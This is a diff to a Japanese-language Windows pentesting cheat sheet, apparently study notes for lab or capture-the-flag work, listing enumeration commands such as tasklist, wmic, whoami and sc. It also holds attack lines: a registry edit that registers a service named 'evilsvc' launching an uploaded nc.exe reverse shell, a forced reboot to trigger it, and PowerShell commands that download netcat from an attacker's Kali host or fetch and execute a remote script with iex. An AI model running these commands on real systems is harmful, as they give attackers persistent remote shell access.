@@ -17,6 +17,8 @@
 
 ``` bat
     tasklist /SVC
+    
+    tasklist /m
 ```
 
 * schtasks
@@ -59,11 +61,8 @@
 * ファイル検索
 
 ``` bat
-    dir /s *<file_name>*
-    または
-    wmic DATAFILE where "drive='C:' AND Name like '%<file_name>%'" GET Name,Readable,size /VALUE
-
-    # 検索でよく使うファイルパターン
+    dir /s *<file_name>*  
+　  # 検索でよく使うファイルパターン
     *.txt/*.doc/*.xls/*.one/*.cnf/unattend.xml
 ```
 
@@ -76,20 +75,45 @@
 
 ``` bat
     #wordpressから[nc.exe]をfile uploadする必要がある。
-    reg add HKLM\SYSTEM\CurrentControlSet\Services\evilsvc /t REG_EXPAND_SZ /v ImagePath /d "cmd /c \"C:\inetpub\wwwroot\wordpress\wp-content\themes\twentytwenty\nc.exe 172.31.42.71 4444 -e cmd\"" /f
+    reg add HKLM\SYSTEM\CurrentControlSet\Services\evilsvc /t REG_EXPAND_SZ /v ImagePath /d "cmd /c \"C:\inetpub\wwwroot\wordpress\wp-content\themes\twentytwenty\nc.exe XXX.XX.XX.XX PPPP -e cmd\"" /f
 
     #再起動できる場合は再起動
-    shutdown /r /t 0
+    shutdown /r /t 0 /f
 ```
 
-* サービス登録
+* sc
 
 ``` batch
     # サービス登録コマンド
     # notepad.exeをシステム起動時に自動起動するサービスを登録するコマンド 
     sc create notepad binpath= "C:¥Windows¥system32¥notepad.exe" start=auto
-    # 
-    sc qc evilsvc
+    # サービス情報の表示
+    sc qc <service_name>
+    # サービス起動
+    sc start <service_name>
+    # サービス停止
+    sc stop <service_name>
+```
+
+* wmic
+
+``` bat
+    #システム情報
+    wmic computersystem LIST full
+    #サービス検索
+    wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\"
+    #ファイル検索
+    wmic DATAFILE where "drive='C:' AND Name like '%<file_name>%'" GET Name,Readable,size /VALUE
+```
+
+* whoami
+
+``` bat
+    whoami
+    #権限表示
+    whoami /priv
+    #グループ表示
+    whoami /group
 ```
 
 ## PowerShell
@@ -100,10 +124,14 @@
     $PsVersionTable
 ```
 
-* ファイル転送
+* ファイルダウンロード
 
 ``` powershell
-    powershell -NoProfile -ExecutionPolicy unrestricted -Command (Invoke-WebRequest -Uri "http://<Remote KaliのIP>:8000/nc64.exe" -OutFile "nc64.exe")
+    powershell -NoProfile -ExecutionPolicy unrestricted -Command (Invoke-WebRequest -Uri "http://<Remote KaliのIP>:8000/nc.exe" -OutFile "nc.exe")
+    
+    iwr -Uri http://XXX.XXX.XXX.XXX/<file_name> -OutFile "<file_path>\<file_name>>"
+    
+    iex(new-object net.webclient).downloadstring('http://XXX.XXX.XXX.XXX/<file_name>')
 ```
 
 * 共有ドライブ
